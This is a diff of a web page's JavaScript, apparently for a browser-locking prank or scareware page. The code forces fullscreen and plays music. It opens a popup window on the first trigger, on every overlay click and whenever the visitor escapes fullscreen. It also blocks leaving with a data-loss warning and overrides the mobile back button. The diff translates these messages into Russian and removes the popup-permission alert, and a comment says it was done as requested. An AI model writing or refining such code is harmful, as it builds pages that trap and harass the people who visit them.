@@ -256,7 +256,7 @@
             });
 
             window.addEventListener('beforeunload', function (e) {
-                const message = "WARNING: All unsaved data and progress will be permanently lost. Are you sure you want to leave the page?";
+                const message = "ВНИМАНИЕ: Все несохраненные данные и прогресс будут безвозвратно утеряны. Вы точно хотите покинуть страницу?";
                 e.preventDefault();
                 e.returnValue = message;
                 return message;
@@ -278,46 +278,47 @@
         }
 
         function triggerFullScreen() {
-            // Always show the alert first
-            alert('Пожалуйста, разрешите всплывающие окна для этого сайта.');
+            // The alert for popups has been removed as requested.
 
-            // After the user clicks OK, continue with the rest.
             startSession();
             requestFullScreenMode();
             fullscreenContent.style.display = 'block';
             bgMusic.play();
             
-            // Open the first popup immediately on desktop
+            // On desktop, open the first popup immediately.
+            // On mobile, this block is skipped, so no popups will appear.
             if (!isMobileDevice) {
                 window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
             }
             
+            // For mobile devices (like in a Cordova/PhoneGap app), handle the back button.
             if (isMobileDevice) {
                 document.addEventListener('backbutton', function(e) {
                     e.preventDefault();
-                    if (confirm("Are you sure you want to exit?")) {
+                    if (confirm("Вы уверены, что хотите выйти?")) {
                         fullscreenContent.style.display = 'none';
                         bgMusic.pause();
+                        // Optionally, you might want to allow navigation back after this.
+                        // For now, it just hides the overlay.
                     }
                 }, false);
             }
         }
 
-        // Listener for clicks on the fullscreen background
+        // Listener for clicks on the fullscreen background (desktop only)
         fullscreenContent.addEventListener('click', function() {
             if (!isMobileDevice) {
                 window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
             }
         });
         
-        // Listener for fullscreen state changes (e.g., pressing Escape)
+        // Listener for fullscreen state changes (e.g., pressing Escape on desktop)
         document.addEventListener('fullscreenchange', function() {
-            // If fullscreen is exited, but the menu content is visible, open a popup
             if (!document.fullscreenElement && fullscreenContent.style.display === 'block') {
-                // The menu remains visible, music continues, and a new popup appears
                 if (!isMobileDevice) {
                     window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                 }
+                // On mobile, do nothing special when fullscreen is exited.
             }
         });
 
